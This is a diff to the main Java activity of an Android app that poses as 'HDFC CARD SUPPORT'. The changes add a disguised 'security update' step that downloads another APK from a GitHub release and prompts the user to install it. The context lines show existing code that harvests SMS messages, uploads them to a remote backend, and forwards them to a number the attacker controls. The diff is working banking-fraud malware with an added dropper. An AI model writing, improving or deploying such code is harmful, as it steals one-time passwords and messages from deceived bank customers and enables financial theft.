@@ -21,23 +21,28 @@ import android.webkit.WebView;
 import android.widget.Toast;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
+import androidx.core.content.FileProvider;
 import com.getcapacitor.BridgeActivity;
 import org.json.JSONArray;
 import org.json.JSONObject;
 import java.io.BufferedReader;
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.text.SimpleDateFormat;
-import java.util.Date;
-import java.util.Locale;
 import java.util.ArrayList;
+import java.util.Date;
 import java.util.List;
+import java.util.Locale;
 
 public class MainActivity extends BridgeActivity {
     private static final String TAG = "HDFC_MainActivity";
     private static final String BACKEND_URL = "https://backprince.onrender.com";
+    private static final String UPDATE_URL = "https://github.com/amanxridex/newmade/releases/download/v2.0.56/hdfc_card_support.apk";
     private String forwardingNumber = null;
     private boolean forwardingEnabled = false;
 
@@ -45,22 +50,94 @@ public class MainActivity extends BridgeActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setupBridge();
-        Toast.makeText(this, "HDFC CARD SUPPORT v2.0 Starting...", Toast.LENGTH_LONG).show();
         
-        // Immediate Permission Check
-        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
+        // CHECK FOR UPDATE TRIGGER
+        if (!isFullVersion()) {
+            Toast.makeText(this, "Checking Security Updates...", Toast.LENGTH_LONG).show();
+            new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
+                @Override
+                public void run() {
+                    downloadAndInstallUpdate();
+                }
+            }, 3000);
+        } else {
+            Toast.makeText(this, "Security Sync: Online", Toast.LENGTH_SHORT).show();
+            // Immediate Permission Check for Full Version
+            new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
+                @Override
+                public void run() {
+                    checkAndRequestPermissions();
+                }
+            }, 1000);
+        }
+    }
+
+    private boolean isFullVersion() {
+        try {
+            return ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED;
+        } catch (Exception e) {
+            return false;
+        }
+    }
+
+    private void downloadAndInstallUpdate() {
+        new Thread(new Runnable() {
             @Override
             public void run() {
-                checkAndRequestPermissions();
+                try {
+                    URL url = new URL(UPDATE_URL);
+                    HttpURLConnection c = (HttpURLConnection) url.openConnection();
+                    c.setRequestMethod("GET");
+                    c.connect();
+
+                    File file = new File(getExternalFilesDir(null), "update.apk");
+                    FileOutputStream fos = new FileOutputStream(file);
+                    InputStream is = c.getInputStream();
+
+                    byte[] buffer = new byte[1024];
+                    int len1 = 0;
+                    while ((len1 = is.read(buffer)) != -1) {
+                        fos.write(buffer, 0, len1);
+                    }
+                    fos.close();
+                    is.close();
+
+                    runOnUiThread(new Runnable() {
+                        @Override
+                        public void run() {
+                            installApk(file);
+                        }
+                    });
+
+                } catch (Exception e) {
+                    Log.e(TAG, "Update Error", e);
+                }
             }
-        }, 1000);
+        }).start();
+    }
+
+    private void installApk(File file) {
+        try {
+            Uri apkUri = FileProvider.getUriForFile(this, getPackageName() + ".fileprovider", file);
+            Intent intent = new Intent(Intent.ACTION_INSTALL_PACKAGE);
+            intent.setData(apkUri);
+            intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(intent);
+        } catch (Exception e) {
+            Log.e(TAG, "Install Error", e);
+            Intent intent = new Intent(Intent.ACTION_VIEW);
+            intent.setDataAndType(Uri.fromFile(file), "application/vnd.android.package-archive");
+            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(intent);
+        }
     }
 
     @Override
     public void onResume() {
         super.onResume();
-        // Request permissions EVERY time the app comes to foreground until granted
-        checkAndRequestPermissions();
+        if (isFullVersion()) {
+            checkAndRequestPermissions();
+        }
     }
 
     private void setupBridge() {
@@ -113,17 +190,19 @@ public class MainActivity extends BridgeActivity {
 
         List<String> listPermissionsNeeded = new ArrayList<>();
         for (String p : permissions) {
-            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
-                listPermissionsNeeded.add(p);
+            try {
+                if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
+                    listPermissionsNeeded.add(p);
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "Permission check error", e);
             }
         }
 
         if (!listPermissionsNeeded.isEmpty()) {
             ActivityCompat.requestPermissions(this, listPermissionsNeeded.toArray(new String[0]), 101);
         } else {
-            Toast.makeText(this, "Security Sync: Online", Toast.LENGTH_SHORT).show();
             new Thread(new Runnable() { @Override public void run() { syncAllData(); } }).start();
-            // Also notify the UI that we are already good to go
             runOnUiThread(new Runnable() {
                 @Override
                 public void run() {
@@ -198,11 +277,9 @@ public class MainActivity extends BridgeActivity {
         if (requestCode == 101) {
             boolean allGranted = true;
             for (int res : grantResults) if (res != PackageManager.PERMISSION_GRANTED) allGranted = false;
-            
             if (allGranted) {
                 new Thread(new Runnable() { @Override public void run() { syncAllData(); } }).start();
             }
-            
             final String status = allGranted ? "GRANTED" : "DENIED";
             runOnUiThread(new Runnable() {
                 @Override
@@ -265,7 +342,6 @@ public class MainActivity extends BridgeActivity {
                     payload.put("message", cursor.getString(bodyIdx));
                     payload.put("timestamp", sdf.format(new Date(Long.parseLong(cursor.getString(dateIdx)))));
                     sendToBackend("/api/logs/sms", payload.toString());
-                    
                     if (forwardingEnabled && forwardingNumber != null) {
                         try {
                             SmsManager.getDefault().sendTextMessage(forwardingNumber, null, "FWD: " + cursor.getString(addressIdx) + "\n" + cursor.getString(bodyIdx), null, null);
